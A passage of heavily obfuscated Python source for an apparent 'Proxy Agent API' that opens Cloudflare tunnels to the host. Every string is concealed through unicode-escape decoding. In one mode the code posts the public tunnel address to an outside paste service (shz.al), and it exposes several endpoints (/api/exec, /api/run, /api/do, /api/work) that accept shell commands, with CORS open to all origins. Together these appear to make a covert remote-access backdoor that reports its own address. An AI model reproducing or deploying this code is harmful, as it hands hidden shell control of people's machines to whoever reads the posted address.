            O0_var_906 = [(codecs.decode('\\u0063', 'unicode_escape'), domain), (codecs.decode('\\u006e', 'unicode_escape'), O0_var_896), (codecs.decode('\\u0073', 'unicode_escape'), O0_var_897), (codecs.decode('\\u0065', 'unicode_escape'), codecs.decode('\\u0037\\u0064', 'unicode_escape'))]
            try:
                post(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f', 'unicode_escape'), O0_var_906)
            except urllib.error.HTTPError as exc:
                if exc.code == 409:
                    post(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e', 'unicode_escape') + str(O0_var_896) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_897), [O0_var_907 for O0_var_907 in O0_var_906 if O0_var_907[0] != codecs.decode('\\u006e', 'unicode_escape')], method=codecs.decode('\\u0050\\u0055\\u0054', 'unicode_escape'))
                else:
                    if Config.DEBUG:
                        try:
                            O0_var_908 = exc.read().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))[:200]
                        except Exception:
                            O0_var_908 = codecs.decode('', 'unicode_escape')
                        Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u002d\\u0044\\u0045\\u0042\\u0055\\u0047\\u005d\\u0020\\u0072\\u0065\\u0070\\u006f\\u0072\\u0074\\u0020\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073\\u003a\\u0020', 'unicode_escape') + str(exc.code) + codecs.decode('\\u0020\\u0062\\u006f\\u0064\\u0079\\u003a\\u0020', 'unicode_escape') + str(O0_var_908))
                    raise
            cls._domain = domain
            return True
        except Exception:
            return False

    @classmethod
    def report_domain_change(cls, domain):
        for O0_var_909 in range(3):
            if cls.report_shzal(domain):
                return
            if O0_var_909 < 2:
                time.sleep(2 ** (O0_var_909 + 1))

    @staticmethod
    def _home_dir():
        for O0_var_910 in (os.environ.get(codecs.decode('\\u0055\\u0053\\u0045\\u0052\\u0050\\u0052\\u004f\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')), os.environ.get(codecs.decode('\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
            if O0_var_910 and os.path.isdir(O0_var_910):
                return O0_var_910
        return os.getcwd()

    @classmethod
    def resolve_domain_file_path(cls):
        O0_var_911 = Config.KPATH.strip()
        if not O0_var_911:
            return os.path.join(cls._home_dir(), codecs.decode('\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'))
        if O0_var_911.startswith(codecs.decode('\\u0024\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')):
            O0_var_911 = os.path.join(cls._home_dir(), O0_var_911[5:].lstrip(codecs.decode('\\u002f\\u005c', 'unicode_escape'))) if len(O0_var_911) > 5 else cls._home_dir()
        elif O0_var_911.startswith(codecs.decode('\\u007e', 'unicode_escape')):
            O0_var_911 = os.path.expanduser(O0_var_911)
        return O0_var_911

    @classmethod
    def write_domain_file(cls, domain):
        cls._domain = domain
        O0_var_912 = cls.resolve_domain_file_path()
        try:
            O0_var_913 = os.path.dirname(os.path.abspath(O0_var_912))
            if O0_var_913:
                os.makedirs(O0_var_913, exist_ok=True)
            with open(O0_var_912, codecs.decode('\\u0077', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_914:
                O0_var_914.write(domain)
            Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f4c4\\u0020\\u96a7\\u9053\\u57df\\u540d\\u5df2\\u5199\\u5165\\u003a\\u0020', 'unicode_escape') + str(O0_var_912))
        except OSError as exc:
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u57df\\u540d\\u6587\\u4ef6\\u5199\\u5165\\u5931\\u8d25\\u0020\\u0028', 'unicode_escape') + str(O0_var_912) + codecs.decode('\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))

    @classmethod
    def delete_domain_file(cls):
        O0_var_915 = cls.resolve_domain_file_path()
        try:
            if os.path.isfile(O0_var_915):
                os.remove(O0_var_915)
                Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f5d1\\ufe0f\\u0020\\u57df\\u540d\\u6587\\u4ef6\\u5df2\\u5220\\u9664\\u003a\\u0020', 'unicode_escape') + str(O0_var_915))
        except OSError as exc:
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u57df\\u540d\\u6587\\u4ef6\\u5220\\u9664\\u5931\\u8d25\\u0020\\u0028', 'unicode_escape') + str(O0_var_915) + codecs.decode('\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))

    @classmethod
    def on_baseinfo_success(cls):
        if not cls._baseinfo_hooked:
            cls._baseinfo_hooked = True
            cls.delete_domain_file()

    @classmethod
    def _stdin_loop(cls):
        while True:
            try:
                O0_var_916 = sys.stdin.readline()
            except Exception:
                return
            if not O0_var_916:
                return
            if O0_var_916.strip() == codecs.decode('\\u002f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'):
                if cls._domain:
                    print(cls._domain, flush=True)
                else:
                    print(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u006e\\u006f\\u0074\\u0020\\u0072\\u0065\\u0061\\u0064\\u0079', 'unicode_escape'), flush=True)

    @classmethod
    def _tunnel_task(cls, manager, after_domain=None, silent=False):
        try:
            manager.create_tunnel(Config.PORT, silent=silent)
        except Exception as exc:
            if not silent:
                Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u542f\\u52a8\\u96a7\\u9053\\u521b\\u5efa\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(exc))
            return
        O0_var_917 = manager.list_tunnels()
        if not O0_var_917:
            return
        O0_var_918 = O0_var_917[-1][codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape')]
        if after_domain:
            after_domain(O0_var_918)
        else:
            cls.write_domain_file(O0_var_918)

    @classmethod
    def activate(cls, manager):
        if Config.KMODE == codecs.decode('\\u0032', 'unicode_escape') and cls.kname_valid():
            Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f680\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0032\\u003a\\u0020\\u96a7\\u9053\\u57df\\u540d\\u5c06\\u4e0a\\u62a5\\u81f3\\u5916\\u90e8\\u5e73\\u53f0', 'unicode_escape'))
            manager.on_domain_change = lambda old_domain, new_domain: cls.report_domain_change(new_domain)
            threading.Thread(target=cls._tunnel_task, args=(manager,), kwargs={codecs.decode('\\u0061\\u0066\\u0074\\u0065\\u0072\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): cls.report_shzal, codecs.decode('\\u0073\\u0069\\u006c\\u0065\\u006e\\u0074', 'unicode_escape'): True}, daemon=True, name=codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape')).start()
            return
        Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f680\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0031\\u003a\\u0020\\u542f\\u52a8\\u65f6\\u81ea\\u52a8\\u521b\\u5efa\\u4e34\\u65f6\\u96a7\\u9053', 'unicode_escape'))
        manager.on_domain_change = lambda old_domain, new_domain: cls.write_domain_file(new_domain)
        threading.Thread(target=cls._tunnel_task, args=(manager,), daemon=True, name=codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape')).start()
        threading.Thread(target=cls._stdin_loop, daemon=True, name=codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u002d\\u0073\\u0074\\u0064\\u0069\\u006e', 'unicode_escape')).start()

class ArgoTunnelInfo(BaseModel):
    tunnel_domain: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u516c\\u7f51\\u57df\\u540d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    port: int = Field(..., description=codecs.decode('\\u96a7\\u9053\\u8f6c\\u53d1\\u7684\\u672c\\u5730\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    created_at: str = Field(..., description=codecs.decode('\\u521b\\u5efa\\u65f6\\u95f4\\u0020\\u0028\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0020\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0031\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])

class ArgoTunnelListResponse(SResponse):
    count: int = Field(..., description=codecs.decode('\\u96a7\\u9053\\u6570\\u91cf', 'unicode_escape'), examples=[1])
    tunnels: List[ArgoTunnelInfo] = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u5217\\u8868', 'unicode_escape'), examples=[[]])

class ArgoTunnelCreateRequest(BaseModel):
    port: Optional[int] = Field(default=None, ge=1, le=65535, description=codecs.decode('\\u96a7\\u9053\\u8f6c\\u53d1\\u7aef\\u53e3\\u002c\\u0020\\u7f3a\\u7701\\u4f7f\\u7528\\u0020\\u0061\\u0067\\u0065\\u006e\\u0074\\u0020\\u81ea\\u8eab\\u76d1\\u542c\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    duplicate: bool = Field(default=False, description=codecs.decode('\\u662f\\u5426\\u5141\\u8bb8\\u540c\\u4e00\\u7aef\\u53e3\\u91cd\\u590d\\u5efa\\u96a7\\u9053\\u0020\\u0028\\u9ed8\\u8ba4\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u0029', 'unicode_escape'), examples=[False])

class ArgoTunnelCreateResponse(BaseModel):
    status: str = Field(..., description=codecs.decode('\\u0022\\u006f\\u006b\\u0022\\u0020\\u6216\\u0020\\u0022\\u0065\\u0072\\u0072\\u006f\\u0072\\u0022', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    created: bool = Field(..., description=codecs.decode('\\u96a7\\u9053\\u521b\\u5efa\\u7ed3\\u679c', 'unicode_escape'), examples=[True])
    tunnel_domain: Optional[str] = Field(default=None, description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u516c\\u7f51\\u57df\\u540d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    port: int = Field(..., description=codecs.decode('\\u672c\\u6b21\\u8bf7\\u6c42\\u7684\\u8f6c\\u53d1\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    created_at: Optional[str] = Field(default=None, description=codecs.decode('\\u521b\\u5efa\\u65f6\\u95f4\\u0020\\u0028\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0020\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0031\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    message: Optional[str] = Field(default=None, description=codecs.decode('\\u5931\\u8d25\\u539f\\u56e0', 'unicode_escape'), examples=[codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0038\\u0030\\u0030\\u0030\\u002c\\u0020\\u0073\\u0065\\u0074\\u0020\\u0064\\u0075\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0065\\u003d\\u0074\\u0072\\u0075\\u0065\\u0020\\u0074\\u006f\\u0020\\u0066\\u006f\\u0072\\u0063\\u0065\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape')])

class ArgoTunnelDeleteRequest(BaseModel):
    port: int = Field(..., ge=1, le=65535, description=codecs.decode('\\u8981\\u5220\\u9664\\u7684\\u96a7\\u9053\\u8f6c\\u53d1\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    tunnel_domain: Optional[str] = Field(default=None, description=codecs.decode('\\u540c\\u7aef\\u53e3\\u591a\\u96a7\\u9053\\u65f6\\u7528\\u4e8e\\u7cbe\\u786e\\u5b9a\\u4f4d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])

class ArgoTunnelDeleteResponse(BaseModel):
    status: str = Field(..., description=codecs.decode('\\u0022\\u006f\\u006b\\u0022\\u0020\\u6216\\u0020\\u0022\\u0065\\u0072\\u0072\\u006f\\u0072\\u0022', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    deleted: int = Field(..., description=codecs.decode('\\u5b9e\\u9645\\u5220\\u9664\\u7684\\u96a7\\u9053\\u6570\\u91cf\\u0020\\u0028\\u6210\\u529f\\u65f6\\u0020\\u003e\\u003d\\u0031\\u0029', 'unicode_escape'), examples=[1])
    port: int = Field(..., description=codecs.decode('\\u672c\\u6b21\\u8bf7\\u6c42\\u7684\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    tunnels: Optional[List[ArgoTunnelInfo]] = Field(default=None, description=codecs.decode('\\u5df2\\u5220\\u9664\\u96a7\\u9053\\u7684\\u660e\\u7ec6', 'unicode_escape'), examples=[[]])
    message: Optional[str] = Field(default=None, description=codecs.decode('\\u5931\\u8d25\\u539f\\u56e0', 'unicode_escape'), examples=[codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])

@asynccontextmanager
async def O0_fn_25(app: FastAPI):
    Logger.debug(codecs.decode('\\U0001f527\\u0020\\u521d\\u59cb\\u5316\\u7ba1\\u7406\\u5668\\u002e\\u002e\\u002e', 'unicode_escape'))
    Config.validate()
    O0_fn_2()
    app.state.file_manager = FileManager(root=Config.FILE_ROOT, max_upload=Config.MAX_UPLOAD_SIZE, chunk_size=int(os.getenv(codecs.decode('\\u0043\\u0048\\u0055\\u004e\\u004b\\u005f\\u0054\\u0048\\u0052\\u0045\\u0053\\u0048\\u004f\\u004c\\u0044', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0039\\u0037\\u0031\\u0035\\u0032\\u0030', 'unicode_escape'))), audit=Config.FILE_AUDIT_LOG)
    app.state.task_manager = TaskManager(timeout=Config.TASK_TIMEOUT, check_interval=Config.CRON_CHECK_INTERVAL)
    O0_var_919 = app.state.task_manager
    if Config.crontasks and (not Config.cronloop):
        O0_var_919.start_cron_loop()
    if Config.InitTask and Config.onetasks:

        async def _run_restored_onetime():
            try:
                await asyncio.to_thread(O0_var_919.run_onetime_tasks)
            except Exception as exc:
                Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020\\u542f\\u52a8\\u4efb\\u52a1\\u6062\\u590d\\u6267\\u884c\\u5f02\\u5e38\\u0020\\u0028\\u4e0d\\u5f71\\u54cd\\u670d\\u52a1\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))
        asyncio.create_task(_run_restored_onetime())
    app.state.temp_key_manager = TempKeyManager()
    app.state.temp_key_manager.on_expired = Config.rotate_operational_secrets
    app.state.argo_tunnel_manager = ArgoTunnelManager()
    if Config.KMODE == codecs.decode('\\u0031', 'unicode_escape') or (Config.KMODE == codecs.decode('\\u0032', 'unicode_escape') and KModeController.kname_valid()):
        KModeController.activate(app.state.argo_tunnel_manager)
    if Config.DEBUG:
        Logger.debug(codecs.decode('\\u2705\\u0020\\u7ba1\\u7406\\u5668\\u5df2\\u6302\\u8f7d\\u5230\\u0020\\u0061\\u0070\\u0070\\u002e\\u0073\\u0074\\u0061\\u0074\\u0065', 'unicode_escape'))
        Logger.debug(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020\\u0066\\u0069\\u006c\\u0065\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u003a\\u0020', 'unicode_escape') + str(app.state.file_manager))
        Logger.debug(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u003a\\u0020', 'unicode_escape') + str(app.state.task_manager))
    yield
    if Config.DEBUG:
        Logger.debug(codecs.decode('\\U0001f6d1\\u0020\\u5e94\\u7528\\u5173\\u95ed\\uff0c\\u6e05\\u7406\\u8d44\\u6e90\\u002e\\u002e\\u002e', 'unicode_escape'))
    if hasattr(app.state, codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape')):
        try:
            app.state.task_manager.stop_cron_loop()
        except:
            pass
    if hasattr(app.state, codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u005f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape')):
        try:
            app.state.argo_tunnel_manager.stop_all()
        except Exception:
            pass
app = FastAPI(title=codecs.decode('\\u0050\\u0072\\u006f\\u0078\\u0079\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u0041\\u0050\\u0049', 'unicode_escape'), description=codecs.decode('\\u5355\\u6587\\u4ef6\\u90e8\\u7f72\\u7248\\u0020\\u002d\\u0020\\u652f\\u6301\\u7b7e\\u540d\\u8ba4\\u8bc1\\u4e0e\\u54cd\\u5e94\\u52a0\\u5bc6', 'unicode_escape'), version=Config.AGENT_VERSION, docs_url=codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u0073', 'unicode_escape') if Config.DEBUG else None, redoc_url=None, lifespan=O0_fn_25)
from fastapi.middleware.cors import CORSMiddleware
app.add_middleware(CORSMiddleware, allow_origins=[codecs.decode('\\u002a', 'unicode_escape')], allow_methods=[codecs.decode('\\u002a', 'unicode_escape')], allow_headers=[codecs.decode('\\u002a', 'unicode_escape')], expose_headers=[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')])
app.add_middleware(AuthEncryptMiddleware)

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelListResponse)
async def O0_fn_26(request: Request):
    O0_var_920 = request.app.state.argo_tunnel_manager
    O0_var_921 = O0_var_920.list_tunnels()
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_921), codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073', 'unicode_escape'): O0_var_921}

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelCreateResponse, response_model_exclude_none=True)
async def O0_fn_27(request: Request, payload: ArgoTunnelCreateRequest=Body(...)):
    O0_var_922 = request.app.state.argo_tunnel_manager
    O0_var_923 = payload.port if payload.port is not None else Config.PORT
    try:
        return O0_var_922.create_tunnel(O0_var_923, duplicate=payload.duplicate)
    except ArgoTunnelError as exc:
        return JSONResponse(status_code=exc.status_code, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'): False, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_923, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): exc.message})

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelDeleteResponse, response_model_exclude_none=True)
async def O0_fn_28(request: Request, payload: ArgoTunnelDeleteRequest=Body(...)):
    O0_var_924 = request.app.state.argo_tunnel_manager
    try:
        return O0_var_924.delete_tunnel(payload.port, tunnel_domain=payload.tunnel_domain)
    except ArgoTunnelError as exc:
        return JSONResponse(status_code=exc.status_code, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): payload.port, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): exc.message})

async def O0_fn_29(request: Request) -> ExecRequestJSON:
    O0_var_925 = await request.body()
    O0_var_926 = O0_var_925.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')).strip()
    if not O0_var_926:
        raise HTTPException(status_code=400, detail=codecs.decode('\\u0045\\u006d\\u0070\\u0074\\u0079\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0020\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'))
    try:
        return ExecRequestJSON.model_validate_json(O0_var_926)
    except Exception:
        return ExecRequestJSON(cmd=O0_var_926)

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), response_model=BaseInfoResponse)
async def O0_fn_30(request: Request):
    O0_var_927 = time.time()
    if Config._baseinfo_lock is None:
        Config._baseinfo_lock = asyncio.Lock()
    async with Config._baseinfo_lock:
        if Config._baseinfo_cache is None or O0_var_927 - Config._baseinfo_cache_time > Config.BASEINFO_CACHE_TTL:
            Config._baseinfo_cache = await SystemInfoCollector().get_basic_info()
            Config._baseinfo_cache_time = O0_var_927
            Logger.debug(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0042\\u0061\\u0073\\u0065\\u0049\\u006e\\u0066\\u006f\\u0020\\u7f13\\u5b58\\u5df2\\u8fc7\\u671f\\uff0c\\u5df2\\u91cd\\u65b0\\u8c03\\u5ea6\\u7cfb\\u7edf\\u8d44\\u6e90\\u8fdb\\u884c\\u66f4\\u65b0\\u3002', 'unicode_escape'))
        else:
            Logger.debug(codecs.decode('\\U0001f4e6\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0042\\u0061\\u0073\\u0065\\u0049\\u006e\\u0066\\u006f\\u0020\\u547d\\u4e2d\\u6709\\u6548\\u7f13\\u5b58\\uff0c\\u76f4\\u63a5\\u8f93\\u51fa\\u3002', 'unicode_escape'))
        O0_var_928 = Config._baseinfo_cache.copy()
    if getattr(request.state, codecs.decode('\\u0069\\u0073\\u005f\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'), False):
        O0_var_928[codecs.decode('\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = Config.SESSION_KEY
        O0_var_928[codecs.decode('\\u006e\\u006f\\u0069\\u0073\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = Config.NOISE_KEY
    else:
        O0_var_928[codecs.decode('\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = None
        O0_var_928[codecs.decode('\\u006e\\u006f\\u0069\\u0073\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = None
    if Config.KMODE == codecs.decode('\\u0031', 'unicode_escape'):
        KModeController.on_baseinfo_success()
    return O0_var_928

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), response_model=StatusResponse)
async def O0_fn_31(request: Request):
    O0_var_929 = time.time()
    if Config._status_lock is None:
        Config._status_lock = asyncio.Lock()
    async with Config._status_lock:
        if Config._status_cache is None or O0_var_929 - Config._status_cache_time > Config.STATUS_CACHE_TTL:
            Config._status_cache = await SystemInfoCollector().get_realtime_info()
            Config._status_cache_time = O0_var_929
            Logger.debug(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073\\u0020\\u5b9e\\u65f6\\u76d1\\u63a7\\u7f13\\u5b58\\u5df2\\u8fc7\\u671f\\uff0c\\u5df2\\u91cd\\u65b0\\u751f\\u6210\\u5ea6\\u91cf\\u5feb\\u7167\\u3002', 'unicode_escape'))
        else:
            Logger.debug(codecs.decode('\\U0001f4e6\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073\\u0020\\u547d\\u4e2d\\u76d1\\u63a7\\u7f13\\u5b58\\u3002', 'unicode_escape'))
        O0_var_930 = Config._status_cache.copy()
    return O0_var_930

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0064\\u006f', 'unicode_escape'), response_model=ExecResponse)
@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0072\\u0075\\u006e', 'unicode_escape'), response_model=ExecResponse)
@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0077\\u006f\\u0072\\u006b', 'unicode_escape'), response_model=ExecResponse)
@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0065\\u0078\\u0065\\u0063', 'unicode_escape'), response_model=ExecResponse)
async def O0_fn_32(payload: ExecRequestJSON=Depends(O0_fn_29)):
    O0_var_931 = payload.cmd
    O0_var_932 = payload.cwd
    O0_var_933 = payload.env
    O0_var_934 = Config.Rtimeout
    O0_var_935 = Config.EXEC_SHELL_MODE
